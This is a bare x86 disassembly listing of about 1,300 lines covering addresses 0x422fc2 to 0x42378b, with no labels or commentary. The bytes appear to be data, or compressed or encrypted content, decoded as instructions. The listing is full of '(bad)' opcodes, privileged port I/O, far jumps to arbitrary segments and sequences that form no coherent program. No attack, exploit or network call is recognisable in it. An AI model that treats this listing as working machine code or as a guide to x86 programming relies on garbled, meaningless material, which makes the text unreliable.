  422fc2:	push   ds
  422fc3:	push   edx
  422fc4:	das    
  422fc5:	pusha  
  422fc6:	repnz fwait
  422fc8:	sub    al,0x98
  422fca:	or     bl,BYTE PTR [esi-0x1d5f2448]
  422fd0:	ins    BYTE PTR es:[edi],dx
  422fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fd2:	pop    eax
  422fd3:	inc    edi
  422fd4:	in     eax,0xa7
  422fd6:	repz dec edi
  422fd8:	or     eax,0x28ea7e8
  422fdd:	add    BYTE PTR [eax],al
  422fdf:	add    BYTE PTR [eax],al
  422fe1:	add    BYTE PTR [edi],cl
  422fe3:	pop    ebx
  422fe4:	test   BYTE PTR [esi],dl
  422fe6:	aam    0xdf
  422fe8:	lahf   
  422fe9:	pop    ebx
  422fea:	dec    ebp
  422feb:	sar    ebx,cl
  422fed:	adc    edi,eax
  422fef:	aad    0xcf
  422ff1:	popa   
  422ff2:	dec    edx
  422ff3:	test   eax,0x4f30001
  422ff8:	add    BYTE PTR [eax],al
  422ffa:	cmp    eax,0xa661554
  422fff:	inc    ebx
  423000:	xor    ah,BYTE PTR [esi]
  423002:	pop    ds
  423003:	mov    edi,0x27aa9298
  423008:	pop    ebx
  423009:	pop    ebp
  42300a:	jmp    0xb58e:0x2121cffc
  423011:	loope  0x422fcc
  423013:	mov    BYTE PTR [esi+eiz*2-0x6b753621],0xf1
  42301b:	pop    edi
  42301c:	or     eax,0x822828c1
  423021:	into   
  423022:	inc    eax
  423023:	and    eax,0xf64d60ca
  423028:	je     0x42305a
  42302a:	imul   ecx
  42302c:	or     al,0x97
  42302e:	xor    edi,DWORD PTR [eax]
  423030:	ins    BYTE PTR es:[edi],dx
  423031:	int    0x37
  423033:	into   
  423034:	mov    ds:0xe43d2ea7,al
  423039:	cmp    bl,ah
  42303b:	pop    esi
  42303c:	adc    DWORD PTR [ebp+0x50],esi
  42303f:	pop    DWORD PTR [edi]
  423041:	xor    DWORD PTR [edi],esi
  423043:	sbb    al,0x93
  423045:	jmp    0xbf44124e
  42304a:	pop    ebp
  42304b:	ret    0x6337
  42304e:	aas    
  42304f:	out    0x1f,eax
  423051:	stos   BYTE PTR es:[edi],al
  423052:	mov    ebp,DWORD PTR [edx+0x59]
  423055:	sub    edi,DWORD PTR [ebp-0x7d]
  423058:	aas    
  423059:	push   es
  42305a:	xchg   esi,eax
  42305b:	test   DWORD PTR [edx-0x1c],edi
  42305e:	jb     0x423010
  423060:	arpl   WORD PTR [edi+0x27],dx
  423063:	sub    al,0x39
  423065:	dec    edx
  423066:	mul    DWORD PTR [ecx+ecx*2-0x8]
  42306a:	fsubr  DWORD PTR [edi-0x73]
  42306d:	dec    edx
  42306e:	inc    edx
  42306f:	fmul   DWORD PTR [esp+eiz*8]
  423072:	data16 data16 lods al,BYTE PTR ds:[esi]
  423075:	xlat   BYTE PTR ds:[ebx]
  423076:	mov    ch,0xf8
  423078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423079:	inc    edx
  42307a:	sbb    ebp,eax
  42307c:	icebp  
  42307d:	sub    al,0xba
  42307f:	mov    ebp,0x6d0df630
  423084:	dec    esp
  423085:	fld    QWORD PTR cs:0xc493c54f
  42308c:	les    esp,FWORD PTR [esi]
  42308e:	pop    edi
  42308f:	cmp    al,0x5c
  423091:	aam    0xb1
  423093:	xchg   ebx,eax
  423094:	pop    ecx
  423095:	mov    esp,0x564fda21
  42309a:	les    eax,FWORD PTR [esi]
  42309c:	jp     0x423088
  42309e:	daa    
  42309f:	pop    edi
  4230a0:	mov    esp,0x73079709
  4230a5:	out    0xb3,al
  4230a7:	(bad)  
  4230a9:	ja     0x423082
  4230ab:	call   0x77cb:0x5e198825
  4230b2:	jae    0x4230da
  4230b4:	ud1    esp,DWORD PTR [edi+0x9]
  4230b8:	cmp    eax,0xc8f3ce33
  4230bd:	mov    cl,0x18
  4230bf:	loop   0x423053
  4230c1:	xchg   ebx,eax
  4230c2:	ret    
  4230c3:	push   0xa8fcef4
  4230c8:	cmp    BYTE PTR [ebx+edx*8+0x22ab5c43],al
  4230cf:	push   edi
  4230d0:	js     0x42312f
  4230d2:	mov    ah,0xa6
  4230d4:	pop    ds
  4230d5:	sahf   
  4230d6:	mov    cl,0x2d
  4230d8:	xor    ebx,DWORD PTR [ecx]
  4230da:	xchg   esp,eax
  4230db:	mov    ah,0xec
  4230dd:	fistp  WORD PTR [esi+eiz*2]
  4230e0:	lods   eax,DWORD PTR ds:[esi]
  4230e1:	in     al,0x15
  4230e3:	test   eax,0x57585a8
  4230e8:	sbb    ebx,DWORD PTR [ebx+0x4d]
  4230eb:	bound  ebp,QWORD PTR [ebx-0x32]
  4230ee:	cmp    DWORD PTR [eax],ebx
  4230f0:	test   bl,bl
  4230f2:	ins    BYTE PTR es:[edi],dx
  4230f3:	sahf   
  4230f4:	leave  
  4230f5:	mov    dh,0xab
  4230f7:	mov    edi,0x18964180
  4230fc:	sar    ah,cl
  4230fe:	mov    al,ds:0xf9b26cdb
  423103:	inc    eax
  423104:	cld    
  423105:	into   
  423106:	mov    ebx,0x6a5f61af
  42310b:	sahf   
  42310c:	in     eax,0x8b
  42310e:	cmp    BYTE PTR [esi+0x554fe5bb],al
  423114:	jmp    0x42313e
  423116:	pop    edi
  423117:	cmp    ch,al
  423119:	ffreep st(2)
  42311b:	in     al,dx
  42311c:	ins    BYTE PTR es:[edi],dx
  42311d:	and    DWORD PTR [edx-0x585851f0],esi
  423123:	lock retf 
  423125:	cli    
  423126:	(bad)  
  423127:	icebp  
  423128:	add    edx,esp
  42312a:	jne    0x423148
  42312c:	pop    esi
  42312d:	repz retf 
  42312f:	fnstsw WORD PTR [bp+si]
  423132:	and    ecx,eax
  423134:	push   eax
  423135:	push   ebp
  423136:	dec    esp
  423137:	xchg   edi,eax
  423138:	jl     0x423115
  42313a:	mov    eax,0xdd488619
  42313f:	fnstcw WORD PTR [ebx-0x61]
  423142:	bound  eax,QWORD PTR [eax]
  423144:	sub    al,BYTE PTR [esi]
  423146:	popa   
  423147:	fist   WORD PTR [eax-0x55f076d3]
  42314d:	test   eax,0x840fb2ad
  423152:	inc    esi
  423153:	outs   dx,BYTE PTR ds:[esi]
  423154:	sub    BYTE PTR [ecx+0x405f7c2b],al
  42315a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42315b:	adc    eax,0x8711e406
  423160:	dec    edi
  423161:	aad    0x20
  423163:	out    dx,eax
  423164:	pop    ebp
  423165:	retf   0x6c3e
  423168:	jns    0x4230f4
  42316a:	mov    dh,0xac
  42316c:	sub    al,0xfd
  42316e:	xor    BYTE PTR [ebx+esi*4+0x66],dl
  423172:	jge    0x42311f
  423174:	rcr    BYTE PTR [edi],1
  423176:	add    eax,DWORD PTR [ecx-0x7e527277]
  42317c:	push   DWORD PTR ds:0x5de71741
  423182:	pop    esp
  423183:	sbb    BYTE PTR [edi],0x9c
  423186:	adc    al,0xd5
  423188:	in     eax,dx
  423189:	and    BYTE PTR [ecx+edi*4],0xf7
  42318d:	in     al,dx
  42318e:	fiadd  WORD PTR ds:0xff3fc648
  423194:	ins    DWORD PTR es:[edi],dx
  423195:	out    0x82,al
  423197:	out    dx,al
  423198:	rol    DWORD PTR [ecx],1
  42319a:	pop    eax
  42319b:	test   DWORD PTR [ebx+0x19],ebp
  42319e:	cmp    ecx,DWORD PTR ds:0x26f08c0f
  4231a4:	push   edx
  4231a5:	jb     0x423135
  4231a7:	dec    esi
  4231a8:	test   al,0x95
  4231aa:	mov    WORD PTR [ecx],gs
  4231ac:	frstor [eax-0x26]
  4231af:	hlt    
  4231b0:	mov    esi,0x9187d7d4
  4231b5:	into   
  4231b6:	stos   BYTE PTR es:[edi],al
  4231b7:	sbb    eax,0xe8d506df
  4231bc:	(bad)  
  4231be:	pop    esp
  4231bf:	dec    ebp
  4231c0:	sar    bl,0x29
  4231c3:	cdq    
  4231c4:	aam    0xcc
  4231c6:	fs test bh,ch
  4231c9:	repz add eax,0x560d51ee
  4231cf:	outs   dx,DWORD PTR ds:[esi]
  4231d0:	rcl    DWORD PTR [ebx],cl
  4231d2:	push   edx
  4231d3:	pop    ecx
  4231d4:	adc    esp,DWORD PTR [edx+0x40]
  4231d7:	xchg   DWORD PTR [ecx+eiz*4-0x67],esp
  4231db:	call   0x722d:0x30a8f892
  4231e2:	dec    ebp
  4231e3:	shr    BYTE PTR [esi+0x12],1
  4231e6:	out    0xa9,al
  4231e8:	in     al,dx
  4231e9:	jne    0x4231b0
  4231eb:	jmp    0x369d:0x4a8dff82
  4231f2:	push   ebp
  4231f3:	dec    ebp
  4231f4:	or     eax,0x533e75c6
  4231f9:	lahf   
  4231fa:	inc    ebp
  4231fb:	push   edi
  4231fc:	jbe    0x423246
  4231fe:	mov    edx,0xcf28429
  423203:	or     DWORD PTR [ecx-0x2d4abb08],ebp
  423209:	or     al,0xf4
  42320b:	call   ecx
  42320d:	dec    eax
  42320e:	inc    edx
  42320f:	sbb    DWORD PTR [ebp-0x15],esi
  423212:	outs   dx,BYTE PTR ds:[esi]
  423213:	imul   ebx,edx,0x3f
  423216:	out    0xa6,eax
  423218:	sub    dl,ah
  42321a:	add    BYTE PTR [ebp+0x1bdaaba2],dl
  423220:	retf   
  423221:	out    dx,al
  423222:	jno    0x423207
  423224:	mov    ebx,0x3db1a49a
  423229:	lock (bad) 
  42322b:	mov    bh,0x87
  42322d:	lar    edx,WORD PTR [edi]
  423230:	jecxz  0x4231e0
  423232:	mov    eax,ds:0x9874226a
  423237:	mov    ebx,0x2529a60c
  42323c:	inc    esi
  42323d:	lahf   
  42323e:	lock mov esp,0xe41ccfcf
  423244:	push   ss
  423245:	rcl    DWORD PTR [ebx+0x672444c2],cl
  42324b:	jmp    0x42329c
  42324d:	mov    bl,0xb4
  42324f:	jecxz  0x423201
  423251:	mov    ch,0xe
  423253:	addr16 mov edi,0xf547ea4
  423259:	and    edx,DWORD PTR [eax-0x5fcf8243]
  42325f:	fld    TBYTE PTR [ebx-0x6]
  423262:	xor    esp,DWORD PTR [ebp-0x35]
  423265:	push   edi
  423266:	cld    
  423267:	jbe    0x4232c1
  423269:	lea    ecx,[esi]
  42326b:	data16 mov es,WORD PTR [edx-0x36e0c9cf]
  423272:	mov    esi,0x2416818
  423277:	dec    ecx
  423278:	jo     0x423231
  42327a:	xor    ah,dl
  42327c:	push   ds
  42327d:	cmp    DWORD PTR [eax],eax
  42327f:	jne    0x4232e8
  423281:	imul   edi,DWORD PTR [ebx+0x1c740a40],0xffffffc7
  423288:	and    ebx,DWORD PTR [ebx+0x70cd2649]
  42328e:	xchg   ebx,eax
  42328f:	inc    ecx
  423290:	sbb    esp,ebp
  423292:	pop    ebp
  423293:	sbb    edx,DWORD PTR [ebx]
  423295:	xchg   esp,eax
  423296:	cmp    DWORD PTR [edi-0x2ef742ae],ecx
  42329c:	jmp    0x6841:0x38905b1c
  4232a3:	test   al,0x3a
  4232a5:	dec    eax
  4232a6:	xchg   ecx,eax
  4232a7:	xchg   esp,eax
  4232a8:	mov    BYTE PTR [edx+0x7213ac9a],dh
  4232ae:	pop    eax
  4232af:	pop    ss
  4232b0:	inc    esi
  4232b1:	leave  
  4232b2:	(bad)
  4232b7:	inc    esi
  4232b8:	imul   BYTE PTR [edx-0x5d]
  4232bb:	add    BYTE PTR [edi],dl
  4232bd:	xchg   esi,eax
  4232be:	cmp    DWORD PTR [edx],esi
  4232c0:	mov    esp,0xed63eb28
  4232c5:	(bad)  [eax+0x29adde4d]
  4232cb:	lods   eax,DWORD PTR ds:[esi]
  4232cc:	ror    cl,cl
  4232ce:	push   es
  4232cf:	stc    
  4232d0:	dec    ebp
  4232d1:	shr    BYTE PTR [edi-0x4f67fec9],1
  4232d7:	in     al,dx
  4232d8:	dec    eax
  4232d9:	push   ds
  4232da:	inc    ebp
  4232db:	xchg   esp,eax
  4232dc:	repnz fstp TBYTE PTR [edi]
  4232df:	(bad)  
  4232e1:	jp     0x4232d5
  4232e3:	add    eax,0xa71c4532
  4232e8:	fsubr  QWORD PTR [edx*4-0x184183b2]
  4232ef:	push   ecx
  4232f0:	arpl   cx,si
  4232f2:	push   ecx
  4232f3:	(bad)
  4232f6:	adc    DWORD PTR [ebx+0x32d5b064],ebx
  4232fc:	stos   BYTE PTR es:[edi],al
  4232fd:	adc    BYTE PTR [ebx],dh
  4232ff:	daa    
  423300:	fsubr  DWORD PTR [ecx]
  423302:	xchg   edi,eax
  423303:	(bad)  
  423304:	aas    
  423305:	dec    esp
  423306:	js     0x4232af
  423308:	or     DWORD PTR [ebx-0x22],edx
  42330b:	mov    al,ds:0xa83def48
  423310:	add    bl,BYTE PTR [esi]
  423312:	scas   eax,DWORD PTR es:[edi]
  423313:	mov    bh,0x88
  423315:	or     eax,0xe1ac056
  42331a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42331b:	or     BYTE PTR [edi],ah
  42331d:	test   BYTE PTR [ebx],0xf9
  423320:	test   BYTE PTR [ecx-0x4b],dh
  423323:	xor    dh,dh
  423325:	or     esp,DWORD PTR [ebp-0x66aedcdc]
  42332b:	mov    ecx,0xfdd36ed5
  423330:	or     DWORD PTR [esi-0x4f],ecx
  423333:	into   
  423334:	push   0x6
  423336:	(bad)  
  423337:	fisttp QWORD PTR [ecx-0x79]
  42333a:	rol    dl,cl
  42333c:	mov    ch,0x90
  42333e:	jnp    0x42333e
  423340:	sub    bh,BYTE PTR ds:0xa8c44282
  423346:	lods   al,BYTE PTR ds:[esi]
  423347:	and    BYTE PTR [edi],dl
  423349:	mov    eax,0xb6db32ef
  42334e:	xchg   esp,eax
  42334f:	mov    DWORD PTR [edx+0x69],edx
  423352:	pop    ss
  423353:	popf   
  423354:	push   esi
  423355:	pop    ds
  423356:	pop    esi
  423357:	xchg   ecx,eax
  423358:	popa   
  423359:	cli    
  42335a:	mov    al,ds:0x15b490b5
  42335f:	pop    ecx
  423360:	adc    eax,0xd15520cf
  423365:	mov    al,ds:0xfbad85cc
  42336a:	stos   BYTE PTR es:[edi],al
  42336b:	fwait
  42336c:	mov    dh,0xad
  42336e:	dec    edi
  42336f:	ret    
  423370:	outs   dx,BYTE PTR ds:[esi]
  423371:	pusha  
  423372:	aad    0xf1
  423374:	mov    esi,0x46935f79
  423379:	nop
  42337a:	jno    0x423363
  42337c:	cmp    al,0x60
  42337e:	aaa    
  42337f:	adc    edi,DWORD PTR [edi+0x3d]
  423382:	in     al,0xc4
  423384:	inc    eax
  423385:	add    al,0x7
  423387:	dec    ebx
  423388:	mov    ecx,0xf230093f
  42338d:	sub    esp,DWORD PTR [ecx-0x2b]
  423390:	mov    dl,0xd1
  423392:	xor    al,0x87
  423394:	retf   0xde25
  423397:	in     eax,0x21
  423399:	mov    WORD PTR [ecx-0x7c],ds
  42339c:	arpl   WORD PTR [ebp-0x6dbf4bc3],di
  4233a2:	push   eax
  4233a3:	das    
  4233a4:	dec    DWORD PTR [eax-0x286c75a6]
  4233aa:	and    DWORD PTR [ecx-0x1e],esi
  4233ad:	data16 fistp WORD PTR [ebx]
  4233b0:	(bad)  
  4233b1:	idiv   bl
  4233b3:	cmp    edi,DWORD PTR [eax]
  4233b5:	adc    eax,0x3f994c50
  4233ba:	cs push es
  4233bc:	push   edi
  4233bd:	cmp    al,cl
  4233bf:	leave  
  4233c0:	pop    ss
  4233c1:	fsub   DWORD PTR [ebx]
  4233c3:	retf   0x6200
  4233c6:	sbb    al,dh
  4233c8:	(bad)  
  4233ca:	(bad)  
  4233cb:	call   0xc3670457
  4233d0:	sbb    DWORD PTR [esi-0x71fe514d],ebx
  4233d6:	xor    DWORD PTR [edi],ebp
  4233d8:	ins    DWORD PTR es:[edi],dx
  4233d9:	mov    edx,0x18899e3f
  4233de:	pop    esp
  4233df:	jg     0x423387
  4233e1:	sti    
  4233e2:	jmp    0x6bf05f79
  4233e7:	inc    edi
  4233e8:	ja     0x423459
  4233ea:	fcmovnbe st,st(3)
  4233ec:	sbb    eax,0x78718a59
  4233f1:	aaa    
  4233f2:	adc    DWORD PTR ss:[edx+0x113225d7],0x15
  4233fa:	cmp    eax,0x1619c7d3
  4233ff:	cli    
  423400:	push   es
  423401:	popa   
  423402:	(bad)  
  423403:	mov    bh,0x79
  423405:	rcr    DWORD PTR [edi],1
  423407:	pusha  
  423408:	xor    eax,0x4e245912
  42340d:	in     eax,dx
  42340e:	jno    0x42343c
  423410:	lock rcl BYTE PTR [ebx],0xda
  423414:	arpl   WORD PTR [edi],si
  423416:	sar    BYTE PTR [ebx-0x792c8fb9],1
  42341c:	add    DWORD PTR [ebx],ebx
  42341e:	inc    esi
  42341f:	lods   eax,DWORD PTR ds:[esi]
  423421:	inc    edi
  423422:	pop    DWORD PTR [edi-0x7e92fda3]
  423428:	into   
  423429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42342a:	or     al,0x41
  42342c:	sbb    esp,ebp
  42342e:	fistp  QWORD PTR [edi+0x50]
  423431:	mov    ch,0xb0
  423433:	hlt    
  423434:	adc    BYTE PTR [ebx+esi*4+0xe],0xc6
  423439:	jo     0x42349f
  42343b:	out    0x4c,eax
  42343d:	in     eax,0xf4
  42343f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423440:	push   ss
  423441:	mov    ds:0xb0eca376,al
  423446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423447:	ins    BYTE PTR es:[edi],dx
  423448:	or     BYTE PTR [ebx-0x79],dl
  42344b:	test   eax,0xc92de4b
  423450:	dec    edi
  423451:	jle    0x4234a3
  423453:	add    DWORD PTR ds:0xe08ef4ba,edx
  423459:	and    ebp,DWORD PTR [edi+0x36dc9b32]
  42345f:	in     al,0x68
  423461:	pop    es
  423462:	enter  0x6b80,0x44
  423466:	sub    al,0xb
  423468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423469:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42346b:	xor    eax,0x1dcac543
  423470:	adc    al,0xe2
  423472:	mov    bh,BYTE PTR [eax-0x78]
  423475:	aam    0x1
  423477:	jo     0x423498
  423479:	mov    al,0x6b
  42347b:	sbb    dl,ah
  42347d:	and    dh,BYTE PTR [ebx+0x47]
  423480:	and    BYTE PTR [edx+esi*8-0xd6d85cd],ch
  423487:	jo     0x42347c
  423489:	jne    0x42344b
  42348b:	repnz inc DWORD PTR [esi]
  42348e:	adc    bh,BYTE PTR [esi]
  423490:	int3   
  423491:	add    BYTE PTR [edx],dl
  423493:	clc    
  423494:	out    0x6c,eax
  423496:	cmp    ebp,DWORD PTR [esp+ebp*8-0x17d74ea2]
  42349d:	mov    al,ds:0x640ce3f8
  4234a2:	call   0xc410e164
  4234a7:	jns    0x4234a1
  4234a9:	cmp    al,0x89
  4234ab:	in     eax,0xe
  4234ad:	mov    edx,0x13bf8185
  4234b2:	jge    0x423439
  4234b4:	and    edx,esp
  4234b6:	aas    
  4234b7:	test   dh,dh
  4234b9:	arpl   WORD PTR es:[eax],bx
  4234bc:	sub    DWORD PTR [eax],ecx
  4234be:	dec    eax
  4234bf:	sbb    ebp,DWORD PTR [edx-0x27ec7dc2]
  4234c5:	lds    ebx,FWORD PTR [esi+0x53239f5e]
  4234cb:	sbb    BYTE PTR ds:0x37f8bf7f,al
  4234d1:	fs jmp 0x2cfcb888
  4234d7:	mov    ?,WORD PTR [esi]
  4234d9:	jmp    0xb4cc:0x9181216f
  4234e0:	pop    esi
  4234e1:	xchg   ecx,esi
  4234e3:	mov    DWORD PTR [ebx-0x18],0xb4ddec88
  4234ea:	not    DWORD PTR [ebp+0x8c]
  4234f0:	add    BYTE PTR [eax],al
  4234f2:	dec    ecx
  4234f3:	mov    ds:0xf6ffd655,eax
  4234f8:	retf   
  4234f9:	mov    edi,0x3f1d56c2
  4234fe:	ja     0x42357d
  423500:	mov    BYTE PTR [edx],0x3d
  423503:	scas   al,BYTE PTR es:[edi]
  423504:	add    DWORD PTR [eax],eax
  423506:	repz add al,0x0
  423509:	add    BYTE PTR [esi-0x31f293b7],dl
  42350f:	(bad)  [edi]
  423511:	dec    edx
  423512:	xchg   esp,eax
  423513:	xchg   edx,eax
  423514:	ret    0x3c50
  423517:	outs   dx,BYTE PTR ds:[esi]
  423518:	jmp    0x423574
  42351a:	mov    ecx,0x3c0ffd14
  42351f:	sbb    eax,0x112a0990
  423524:	div    BYTE PTR [ebp+ebp*2-0x7f]
  423528:	mov    esi,esp
  42352a:	xchg   ebp,eax
  42352b:	mov    esp,0xafe2fda0
  423530:	(bad)  
  423531:	xrelease xchg DWORD PTR ds:0x11e0cde4,eax
  423538:	shl    DWORD PTR [ebp+0x69],cl
  42353b:	adc    edx,DWORD PTR [esi-0x1d25e6fa]
  423541:	or     DWORD PTR [eax],esi
  423543:	ficom  DWORD PTR [ebp+0x5fdf7da8]
  423549:	not    ecx
  42354b:	and    al,0x68
  42354d:	sbb    BYTE PTR [edx+0xf],bl
  423550:	data16 hlt 
  423552:	sub    DWORD PTR [edi],esp
  423554:	call   0x17777e8
  423559:	int3   
  42355a:	fst    QWORD PTR [ebx+edi*1]
  42355d:	dec    esp
  42355e:	aam    0x82
  423560:	mul    DWORD PTR es:[edi+0x3e]
  423564:	bound  ecx,QWORD PTR [eax]
  423566:	pop    es
  423567:	sahf   
  423568:	dec    edi
  423569:	jo     0x4235bc
  42356b:	daa    
  42356c:	ins    DWORD PTR es:[edi],dx
  42356d:	out    dx,eax
  42356e:	mov    edi,0x883892
  423573:	mov    es:0x5cb28737,eax
  423579:	cmp    al,0x93
  42357b:	push   0x2f
  42357d:	xchg   ecx,eax
  42357e:	pop    es
  42357f:	and    al,0xeb
  423581:	scas   eax,DWORD PTR es:[edi]
  423582:	pop    ebx
  423583:	cli    
  423584:	cli    
  423585:	sbb    BYTE PTR [esi],bh
  423587:	add    ch,0x35
  42358a:	push   0x9e2d26ca
  42358f:	pop    ds
  423590:	cmp    esi,DWORD PTR [esi+0x2f643b27]
  423596:	adc    ch,BYTE PTR [ecx]
  423598:	pop    ebp
  423599:	xchg   edi,eax
  42359a:	dec    ebx
  42359b:	inc    ecx
  42359c:	imul   eax,DWORD PTR [esi],0x14
  42359f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235a0:	add    al,0x3
  4235a2:	jne    0x423587
  4235a4:	and    edx,DWORD PTR [edi+0x54]
  4235a7:	inc    edx
  4235a8:	pusha  
  4235a9:	jmp    0xb759de2d
  4235ae:	cdq    
  4235af:	stos   DWORD PTR es:[edi],eax
  4235b0:	dec    esp
  4235b1:	out    dx,al
  4235b2:	and    al,0xd3
  4235b4:	aas    
  4235b5:	pop    es
  4235b6:	iret   
  4235b7:	jmp    0x2307:0xc78b6d9b
  4235be:	mov    ecx,0x84aa81b3
  4235c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235c4:	pushf  
  4235c5:	mov    ss,WORD PTR [edx+0x6e4d12a]
  4235cb:	jmp    0xca05b894
  4235d0:	mov    ebp,DWORD PTR [edx+esi*8+0x13]
  4235d4:	jno    0x4235eb
  4235d6:	rol    ah,cl
  4235d8:	test   BYTE PTR [ebx+0x52],ah
  4235db:	cs iret 
  4235dd:	in     al,dx
  4235de:	les    ebx,FWORD PTR [edi]
  4235e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235e1:	pop    ecx
  4235e2:	scas   eax,DWORD PTR es:[edi]
  4235e3:	in     eax,0x6c
  4235e5:	mov    al,ds:0xc9e8cb12
  4235ea:	int    0x85
  4235ec:	leave  
  4235ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235ee:	adc    eax,0xa3b7c7ba
  4235f3:	inc    esp
  4235f4:	or     al,BYTE PTR [eax+0x50]
  4235f7:	je     0x423672
  4235f9:	fidivr DWORD PTR [edi]
  4235fb:	fisttp WORD PTR [ebx+0x6972702a]
  423601:	xchg   esp,eax
  423602:	repz imul eax,DWORD PTR [eax-0x33d9aa7e],0x5bab452f
  42360d:	out    0x38,eax
  42360f:	jbe    0x4235d2
  423611:	add    eax,0xa0a95c7c
  423616:	xchg   ebp,eax
  423617:	stos   BYTE PTR es:[edi],al
  423618:	mov    gs,WORD PTR [ecx+0x63]
  42361b:	mov    esi,0x1b60a7b9
  423620:	not    esi
  423622:	or     ecx,esi
  423624:	push   ecx
  423625:	sub    DWORD PTR [ecx-0x19999eca],ebp
  42362b:	and    DWORD PTR [esi+0x5e9104af],0xffffffbb
  423632:	mov    al,0x53
  423634:	jne    0x4235b9
  423636:	les    edx,FWORD PTR [esi-0x43f90ddc]
  42363c:	xchg   ebx,eax
  42363d:	popf   
  42363e:	mov    ds:0x22e13d56,al
  423643:	(bad)  
  423644:	sub    al,0x12
  423646:	pop    ds
  423647:	dec    esp
  423649:	adc    eax,0x99e73b84
  42364e:	sub    BYTE PTR [ecx-0x77],0xd8
  423652:	push   0x9f316614
  423657:	fcmove st,st(3)
  423659:	rcr    BYTE PTR [ecx],1
  42365b:	pop    esp
  42365c:	cmp    edi,ebp
  42365e:	mov    edi,0x1b46cb4a
  423663:	jmp    0xe18b:0x773144b6
  42366a:	push   esi
  42366b:	shl    BYTE PTR ds:0xb762b3e8,0xae
  423672:	mov    bh,0x5d
  423674:	in     eax,0x18
  423676:	shl    DWORD PTR [ebx],1
  423678:	cmc    
  423679:	xchg   DWORD PTR [esi+0x2a],esi
  42367c:	pop    edx
  42367d:	push   ds
  42367e:	mov    dl,0xd9
  423680:	popa   
  423681:	cmp    ah,bh
  423683:	cmp    al,0x76
  423685:	outs   dx,BYTE PTR ds:[esi]
  423686:	(bad)  
  423687:	pop    esi
  423688:	stc    
  423689:	out    dx,al
  42368a:	enter  0x3c92,0x9a
  42368e:	imul   edi,DWORD PTR [ecx],0xffffffbc
  423691:	aad    0x67
  423693:	mov    ch,0x76
  423695:	and    eax,0x66561b90
  42369a:	hlt    
  42369b:	mov    eax,0xe3af7686
  4236a0:	pop    ds
  4236a1:	das    
  4236a2:	bound  ebx,QWORD PTR [ebp-0x71]
  4236a5:	inc    ebp
  4236a6:	mov    esp,0x8797b0b4
  4236ab:	mov    fs:0x36dd3e15,eax
  4236b1:	xchg   ebp,eax
  4236b2:	out    0x57,eax
  4236b4:	mov    bl,0xc
  4236b6:	cmc    
  4236b7:	cmc    
  4236b8:	sahf   
  4236b9:	enter  0xf62,0x4e
  4236bd:	mov    esi,0x53442a66
  4236c2:	bound  ecx,QWORD PTR [eax]
  4236c4:	dec    edx
  4236c5:	bound  edi,QWORD PTR [eax-0x50e6c40]
  4236cb:	loope  0x42371d
  4236cd:	or     BYTE PTR [edx+0x1ca0a051],dh
  4236d3:	pusha  
  4236d4:	aas    
  4236d5:	push   esp
  4236d6:	inc    esi
  4236d7:	cld    
  4236d8:	lock stos BYTE PTR es:[edi],al
  4236da:	scas   al,BYTE PTR es:[edi]
  4236db:	sbb    al,0xb3
  4236dd:	int3   
  4236de:	mov    eax,0x2af2ef44
  4236e3:	inc    esi
  4236e4:	mov    bh,0x50
  4236e6:	sbb    bh,ah
  4236e8:	dec    edx
  4236e9:	mov    bp,WORD PTR [ebp-0x23]
  4236ed:	dec    esi
  4236ee:	sub    eax,0x5653239
  4236f3:	stos   DWORD PTR es:[edi],eax
  4236f4:	mov    ebx,0x3b483e18
  4236f9:	gs inc esi
  4236fb:	fs xchg esi,eax
  4236fd:	sbb    BYTE PTR [ecx+0x2b19f8d2],dl
  423703:	lods   eax,DWORD PTR ds:[esi]
  423704:	sar    BYTE PTR [eax-0x7704833a],1
  42370a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42370b:	push   ss
  42370c:	inc    eax
  42370d:	and    esp,eax
  42370f:	push   esp
  423710:	mov    bl,0x3a
  423712:	jle    0x4236bf
  423714:	push   ds
  423715:	leave  
  423716:	cdq    
  423717:	in     al,0x70
  423719:	mov    ebx,0x42627cba
  42371e:	xor    DWORD PTR [ecx],eax
  423720:	ret    0x8234
  423723:	cs cmp ebx,esi
  423726:	sbb    dh,BYTE PTR [edx-0x77]
  423729:	xchg   edx,eax
  42372a:	lea    esp,[eax-0x20fb40ee]
  423730:	xchg   ebp,eax
  423731:	test   BYTE PTR [ebx-0x64],bl
  423734:	gs push 0xffffffc0
  423737:	dec    esp
  423738:	adc    ecx,DWORD PTR [ebx]
  42373a:	mov    eax,ds:0x1b48e8d9
  42373f:	push   edx
  423740:	jg     0x423796
  423742:	mov    ah,0xbb
  423744:	sub    ecx,DWORD PTR [ebp-0x2c]
  423747:	pushf  
  423748:	test   BYTE PTR [edx+eiz*8-0x3360945b],ch
  42374f:	xchg   esi,eax
  423750:	(bad)  
  423752:	scas   eax,DWORD PTR es:[edi]
  423753:	mov    bl,0x71
  423755:	mov    dh,0x54
  423757:	addr16 int3 
  423759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42375a:	push   edx
  42375b:	jae    0x4237d3
  42375d:	push   eax
  42375e:	popa   
  42375f:	cmp    DWORD PTR [edx-0x71c6a0f1],ecx
  423765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423766:	xor    BYTE PTR [edx+0x3],0xba
  42376a:	in     al,dx
  42376b:	push   edx
  42376c:	mov    ch,0x1c
  42376e:	enter  0x22fb,0x94
  423772:	into   
  423773:	popf   
  423774:	push   ss
  423775:	sbb    al,BYTE PTR [edx-0x560c146]
  42377b:	push   cs
  42377c:	(bad)  
  42377d:	iret   
  42377e:	cmp    edi,DWORD PTR [edx-0x1c]
  423781:	pop    edx
  423782:	ja     0x423772
  423784:	ffreep st(5)
  423786:	mov    esi,0x10f8e345
  42378b:	sar    BYTE PTR [edx+0x7a2a83de],cl
